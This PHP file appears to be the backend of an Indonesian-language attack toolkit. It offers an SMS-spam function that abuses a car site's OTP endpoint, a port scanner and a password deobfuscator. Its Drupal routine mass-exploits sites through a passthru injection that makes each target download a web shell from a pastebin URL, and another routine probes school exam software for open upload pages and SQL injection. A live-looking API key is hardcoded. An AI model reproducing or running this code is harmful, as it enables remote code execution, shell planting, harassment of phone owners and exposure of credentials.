function spamsmsv1(){
  if(isset($_POST['submit'])){
    $no   = htmlentities(htmlentities(xss_clean($_POST['no'])));
    $jum  = htmlspecialchars(htmlentities(xss_clean($_POST['jumlah'])));

    $data = array(
      'mobileNumber' => $no,
    );

    $curl = curl_init();
          
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.carmudi.co.id/api/profile/tac-code-request",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => array(
          'Content-Type:' => 'application/json',
        )
    ]);
    
    $response = curl_exec($curl);
    
    curl_close($curl);

    if($no != ""){
    $a = 0;
    if($jum != ""){
      echo ' <div class="row">
      <div class="col-12 grid-margin stretch-card">
          <div class="card">
              <div class="card-body">
                  <h4 class="card-title">Result</h4>';
      $jum = 1;
        while($jum > $a){
              if($response == "true"){
                echo '<p class="text-success">'. $a++ .'. Spam Call Berhasil Terkirim</p>';
              }else{
                echo '<p clsas="text-warning">'. $a++ .'. gagal mengirim pesan </p>';
              }
        }
    }else {
      echo "<script>swal.fire('maaf Jumlah tidak boleh kosong','','warning')</script>";
    }
  }else{
    echo "<script>swal.fire('maaf nomor tidak boleh kosong','','warning')</script>";
  }
}
}

// PING SCANNER
set_time_limit(0);
function sws_ping_test($site)
{
$getip = @file_get_contents("http://networktools.nl/ping/$site");
flush();
$ip = @findit($getip,'<pre>','</pre>');
return $ip;
flush();
}
function findit($mytext,$starttag,$endtag) {
$posLeft = @stripos($mytext,$starttag)+strlen($starttag);
$posRight = @stripos($mytext,$endtag,$posLeft+1);
return @substr($mytext,$posLeft,$posRight-$posLeft);
flush();
}

function ping(){
  if(isset($_POST['submit']))
  {
  $site = @htmlentities($_POST['site']);
  if (empty($site)){die('<br> Tidak Tambahkan IP');}
  $ip_port = @gethostbyname($site);
  echo '<pre>' . sws_ping_test($site) . '</pre>';
  flush();
  }
}

// DNS ZONE
function sws_zone_test($site)
{
$getip = @file_get_contents("http://networktools.nl/dns/$site");
flush();
$ip = @jojo($getip,'<pre>','</pre>');
return $ip;
flush();
}
function jojo($mytext,$starttag,$endtag) {
$posLeft = @stripos($mytext,$starttag)+strlen($starttag);
$posRight = @stripos($mytext,$endtag,$posLeft+1);
return @substr($mytext,$posLeft,$posRight-$posLeft);
flush();
}

function dns_zone(){
  if(isset($_POST['submit']))
  {
  $site = @htmlentities($_POST['site']);
  if (empty($site)){die('<br> Tidak Tambahkan IP');}
  $ip_port = @gethostbyname($site);
  echo '<pre>' . sws_zone_test($site) . '</pre>';
  flush();
  }
}

// Scan Port
function port_scanner(){
  if(isset($_POST['submit'])){
    $domain = htmlentities(htmlspecialchars(xss_clean($_POST['domain'])));
    $ports   = array(21, 22, 23, 25, 53, 80, 81, 110, 143, 443, 3306, 3389);

    if($domain == ""){
      echo "<script>swal.fire('Harap Disii terlebih dahulu','','info')</script>";
    }else{
      echo "<script>swal.fire('Berhasil Discan','','success')</script>";
          /*
        | Port numbers:
        | -----------------------
        | Port 21   = FTP       |
        | Port 22   = SSH       |
        | Port 23   = Telnet    |
        | Port 25   = SMTP      |
        | Port 53   = Domain    |
        | Port 80   = HTTP      |
        | Port 110  = POP3      |
        | Port 1433 = ms-sql-s  |
        | Port 3306 = MySQL     |
        | -----------------------
        */
  
        $results = array();
        foreach($ports as $port){
          if($pf = @fsockopen($domain, $port, $err, $err_string, 1)){
            $results[$port] = true;
            fclose($pf);
          }else{
            $results[$port] = false;
          }
        }
  
        foreach($results as $port=>$val){
          $prot = getservbyname($port, "tcp");
            echo "<a href='#' class='btn btn-outline-info'>PORT ". $port ."</a> => ". $prot ."";
          if($val){
            echo "<a href='#' class='btn btn-outline-success'>OK</a><br/><br/>";
          }else{
            echo "<a href='#' class='btn btn-outline-danger'>Tidak bisa diakses</a><br/><br/>";
          }
        }
    }
    }
}

function yt(){
  if(isset($_POST['submit'])){
    $url = htmlentities(htmlspecialchars(xss_clean($_POST['url'])));
      if($url != ""){
        echo "<script>swal.fire('OOps! URL kosong','','info')</script>";
      }else{
        if(strpos($url, "youtube.com")){
            echo '<iframe id="buttonApi" src="https://www.yt2mp3s.me/api/button/mp3?url='. $url .'"
              width="100%" height="100%" allowtransparency="true" scrolling="no" style="border:none"></iframe>';
        }else{
          echo "<script>swal.fire('OOps! Sepertinya ini bukan domain youtube','','warning')</script>";
        }
      }
  }
}

// balitcrack

function unhex($str = '', $code = ''){
  $pwnd = explode('g', $str);
  $result = '';

  $hex = hexdec($pwnd[0]) - $code;
  if ($hex == strlen($pwnd[1])/2) {
    for ($i = 0; $i <= $hex-1; $i++) {
      $result .= chr(hexdec(substr($pwnd[1], $i*2, 2)) - $code);
    }
    $result = '<textarea class="form-control" rows="3"cols="8">'.$str.' = '.strrev($result).'</textarea><br>';
  }
  return $result;
}


function balitcrack(){
  $xc = '';
  $cx = '';
  if(isset($_POST['submit'])){
    $pass = htmlentities(htmlspecialchars(xss_clean($_POST['pass']), ENT_QUOTES), ENT_QUOTES);
      if($pass == ""){
        echo "<script>swal.fire('OOps! Pass kosong','','info')</script>";
      }else{
        $exp = explode("\r\n", $pass);
              foreach ($exp as $value) {
                $cx .= $value;
                for ($i = 0; $i <= 100; $i++) {
                  $xc .= unhex($value, $i);
                }
              }
              echo ''.$xc;
      }
  }
}

// fucntion khusus drupal

function curl($url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  $output = curl_exec($ch);
  curl_close($ch);
  return $output;
}

function sending($sss, $cc){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $sss.'/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=curl+-o+sites/default/files/4dhaxor.php+"https://pastebin.com/raw/vKfyPDA3"');
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_id=user_pass&_triggering_element_name=name');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $ee = curl_exec($ch);
  curl_close($ch);
  return $ee;
}

function sendingajax($sss, $cc){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $sss.'/?q=file/ajax/name/%23value/'.$cc);
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_build_id='.$cc);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $ee = curl_exec($ch);
  curl_close($ch);
  return $ee;
}

function drupal(){
if(isset($_POST['submit'])){
  $url = xss_clean(htmlspecialchars($_POST['url']), ENT_QUOTES);

  if(!$url != ""){
    echo "<script>swal.fire('OOps! Url kosong','','info')</script>";
  }else{
    $beby = explode("\r\n", $url);
    foreach($beby as $aa){
      $link = curl($aa, "/?q=user/password&name[#post_render][]=passthru&name[#type]=markup&name[#markup]=uname+-a");
        if(preg_match('/value="form-/', $link)){
          $get = curl($aa."/?q=user/password&name[#post_render][]=passthru&name[#type]=markup&name[#markup]=uname+-a");
            if(preg_match('# type="hidden" name="form_build_id" value="(.*?)"#is', $get, $matches));
              $ez = $matches[1];
              $send = sending($aa,$ez);
                if(preg_match('# type="hidden" name="form_build_id" value="(.*?)"#is', $send, $matches)){
                  $ez1 = $matches[1];
                  $send_ajax = sendingajax($aa, $ez1);
                  $cekshell = curl("$aa/sites/default/files/sdx.php");
                    if(preg_match('/asmid/', $cekshell)){
                      echo "
                      [ Drupal ] $aa<br>
                      [ Drupal ] <font color=green>Upload Done</font><br>
                      [ Drupal ] Shell -> <a href=$aa/sites/default/files/sdx.php>Cek Shell</a><br>
                      [ Drupal ] <font color=green>Done ~</font><br>";
                    }else{
                      echo "
                      [ Drupal ] $aa<br>
                      [ Drupal ] <font color=red>Upload Error</font><br>
                      [ Drupal ] <font color=red>Done ~</font><br>";
                    }
                }
        }else{
          echo "
            [ Drupal ] $aa<br>
            [ Drupal ] <font color=red>Not Vuln</font><br>
            [ Drupal ] <font color=red>Done ~</font><br>";
        }
    }
  }
}
}
// drupal selesai

function cbt(){
      if (isset($_POST['url']) && !empty($_POST['url'])) {
        $filter = xss_clean(htmlspecialchars($_POST['url']), ENT_QUOTES);
        if(!preg_match('#^http(s)?://#',$filter)){
          $web = "http://".$filter;
        }
        else {
          $web = $filter;
        }
        $exp5 = $web."/admin/?pg=uplsiswa";
        $exp6 = $web."/x-panel/?pg=banksoal&ac=lihat&id=990";
        $candy = array('/plugins/uploadfile/demo/uploads/demo.html', '/plugins/uploadfile/demo/uploads/upload.php','/admin/filesoal.php','/admin/restore.php','/admin/soal/import_file.php','/admin/ifm.php');
        $beesmart = array('/panel/pages/upload-file.php','/panel/pages/upload-logo.php','/panel/pages/upload_audio.php','/panel/pages/upload_video.php','/panel/pages/upload_gambar.php','/panel/pages/upload-fotosiswa.php','/panel/pages/upload-banner.php','/panel/pages/upload_jawab7.php','/panel/pages/upload_jawab6.php','/panel/pages/upload_jawab5.php','/panel/pages/upload_jawab2.php','/panel/pages/upload_jawab1.php');
        if (isset($_POST['cbtcandy'])) {
          if (curl($web."/admin/login.php") == "200") {
            foreach ($candy as $key) {
              $site = $web.$key;
              if (curl($site) == "200") {
                echo "<br><span class='alert alert-success'> Found : <a href='$site' target='_blank'>$site</a></span><br>";
              }
              else {
                echo "<br><span class='alert alert-danger'> Not Found : $site </span><br>";
              }
            }
            if (curl($exp5) == "302") {
              echo "<br><span class='alert alert-warning'> Vuln : <a href='$exp5' target='_blank'>$exp5</a></span><br>";
            }
            else {
              echo "<br><span class='alert alert-danger'>Not Vuln : $exp5 </span>";
            }
            echo "<br>Tutorial Exploit : <a href='https://ecchiexploit.blogspot.com/search?q=candy+cbt' target='_blank'> Klik </a>";
          }
          else if(curl($web."/x-panel/login.php") == "200") {
            if(curl($exp6) == "302"){
              echo "<br><span class='alert alert-success'>Sql Injection With Sqlmap : <a href='$exp6' target='_blank'>$exp6</a><span><br>";
              echo "<br><span class='alert alert-info'> Tutorial : <a href='https://ecchiexploit.blogspot.com/2020/09/sql-injection-in-new-candy-cbt-v28-rev.html' target='_blank'> Klik </a></span>";
            }
            else {
              echo "<br><span class='alert alert-danger'>Not Injection : $exp6 </span>";
            }
          }
          else {
            echo "<script>swal.fire('Oops Not Candy CBT','','info')</script>";
          }
        }
        else if (isset($_POST['cbtbeesmart'])) {
          if (curl($web."/panel/pages/login.php") == "200") {
            foreach ($beesmart as $key) {
              $site = $web.$key;
              if (curl($site) == "200") {
                echo "<br><span class='alert alert-success'>Found : <a href='$site' target='_blank'>$site</a></span><br>";
              }
              else {
                echo "<br><span class='alert alert-warning'>Not Found : $site </span><br>";
              }
            }
          }
          else {
            echo "<script>swal.fire('Oops Not CBT Beesmart','','info')</script>";
          }
        }
      }
    }

function dns(){
      if(isset($_POST['submit'])){
          $domain = htmlspecialchars(xss_clean($_POST['domain']));
          
          $curl = curl_init();
          
          curl_setopt_array($curl, [
              CURLOPT_URL => "https://api.api-ninjas.com/v1/dnslookup?domain=". $domain,
              CURLOPT_RETURNTRANSFER => true,
              CURLOPT_FOLLOWLOCATION => true,
              CURLOPT_ENCODING => "",
              CURLOPT_MAXREDIRS => 10,
              CURLOPT_TIMEOUT => 30,
              CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
              CURLOPT_CUSTOMREQUEST => "GET",
              CURLOPT_HTTPHEADER => [
                "X-Api-Key: Dv1m5rpxTEQaWKj2YA/gwQ==zd6O8eoSG6RjxJuW",
              ],
          ]);
          
          $response = curl_exec($curl);
          $err = curl_error($curl);
          
          curl_close($curl);
          
          if ($err) {
              echo "<script>swal.fire('Hmmm Sepertinya ada gangguan dari server','','warning')</script>";
          } else {
            $data = json_decode($response, true);
            
            foreach($data as $key){
              echo 'Record: <span class="badge bg-success">'. $key['record_type'] .'</span> <span class="badge bg-success">'. $key['value'] .'</span><br><br>';
            }
              }
          }
      }

      function url_lookup(){
        if(isset($_POST['submit'])){
            $domain = htmlspecialchars(xss_clean($_POST['domain']));
            
            $curl = curl_init();
            
            curl_setopt_array($curl, [
                CURLOPT_URL => "https://api.api-ninjas.com/v1/urllookup?url=". $domain,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_ENCODING => "",
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => "GET",
                CURLOPT_HTTPHEADER => [
                  "X-Api-Key: Dv1m5rpxTEQaWKj2YA/gwQ==zd6O8eoSG6RjxJuW",
                ],
            ]);
            
            $response = curl_exec($curl);
            $err = curl_error($curl);
            
            curl_close($curl);
            
            if ($err) {
                echo "<script>swal.fire('Hmmm Sepertinya ada gangguan dari server','','warning')</script>";
            } else {
              $data = json_decode($response, true);
             echo '<!-- Borderless table start -->
             <section class="section">
               <div class="row" id="table-borderless">
                 <div class="col-12">
                   <div class="card">
                     <div class="card-content">
                       <!-- table with no border -->
                       <div class="table-responsive">
                         <table class="table table-borderless mb-0">
                           <tbody>
                             <tr>
                               <td class="text-bold-500">Valid</td>
                               <td><span class="badge bg-success">';
                               if($data['is_valid'] == true){
                                echo '<i class="bi bi-patch-check-fill color:lime"></i>';
                               }else{
                                echo '<i class="bi bi-patch-exclamation-fill color:red"></i>';
                               }
                             echo '</td></tr><tr>
                               <td class="text-bold-500">Country</td>
                               <td><span class="badge bg-success">'. $data['country'] .'</span></td>
                             </tr>
                             <tr>
                               <td class="text-bold-500">Country Code</td>
                               <td><span class="badge bg-success">'. $data['country_code'] .'</span></td>
                             </tr>
                             <tr>
                               <td class="text-bold-500">Region COde</td>
                               <td><span class="badge bg-success">'. $data['region_code'] .'</span></td>
                             </tr>
                             <tr>
                               <td class="text-bold-500">Region</td>
                               <td><span class="badge bg-success">'. $data['region'] .'</span></td>
                             </tr>
                             <tr>
                               <td class="text-bold-500">City</td>
                               <td><span class="badge bg-success">'. $data['city'] .'</span></td>
                             </tr>
                             <tr>
                               <td class="text-bold-500">Zip</td>
                               <td><span class="badge bg-success">'. $data['zip'] .'</span></td>
                             </tr>
                             <tr>
                               <td class="text-bold-500">Lat</td>
                               <td><span class="badge bg-success">'. $data['lat'] .'</span></td>
                             </tr>
                             <tr>
                             <td class="text-bold-500">Lon</td>
                             <td><span class="badge bg-success">'. $data['lon'] .'</span></td>
                           </tr>
                           <tr>
                           <td class="text-bold-500">TImeZone</td>
                           <td><span class="badge bg-success">'. $data['timezone'] .'</span></td>
                         </tr>
                         <tr>
                         <td class="text-bold-500">ISP</td>
                         <td><span class="badge bg-success">'. $data['isp'] .'</span></td>
                       </tr>
                       <tr>
                       <td class="text-bold-500">URL</td>
                       <td><span class="badge bg-success">'. $data['url'] .'</span></td>
                     </tr>
                           </tbody>
                         </table>
                       </div>
                     </div>
                   </div>
                 </div>
               </div>
             </section>
             <!-- Borderless table end -->';
                }
            }
        }
